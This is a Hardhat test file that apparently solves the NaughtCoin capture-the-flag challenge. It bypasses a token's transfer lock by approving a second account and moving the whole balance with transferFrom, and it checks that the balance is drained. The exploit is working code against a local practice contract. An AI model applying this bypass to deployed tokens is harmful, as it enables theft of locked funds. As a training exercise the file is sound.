const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] NaughtCoin Smart Contract', function () {

    let deployer, player;
    let baseContract, attackContract;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, player, attacker] = await ethers.getSigners();
        this.amount = 1000000;
        const baseContractFactory = await ethers.getContractFactory('NaughtCoin', deployer);
        const attackContractFactory = await ethers.getContractFactory('AttackNaughtCoin', player);
        baseContract = await baseContractFactory.deploy(player.address);
        attackContract = await attackContractFactory.deploy(baseContract.address);
        expect(
            await baseContract.balanceOf(player.address)
        ).to.equal(ethers.BigNumber.from("1000000000000000000000000"));
    });

    it('Exploit NaughtCoin Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const tnx1 = await baseContract.connect(player).approve(attacker.address, ethers.BigNumber.from("1000000000000000000000000"));
        await tnx1.wait();
        const tnx2 = await baseContract.connect(attacker).transferFrom(player.address, attacker.address ,ethers.BigNumber.from("1000000000000000000000000"));
        await tnx2.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            ethers.utils.formatEther(await baseContract.balanceOf(player.address))
        ).to.be.equal("0.0");
        expect(
            ethers.utils.formatEther(await baseContract.balanceOf(attacker.address))
        ).to.be.equal(parseFloat(this.amount.toString()).toFixed(1));

    });
});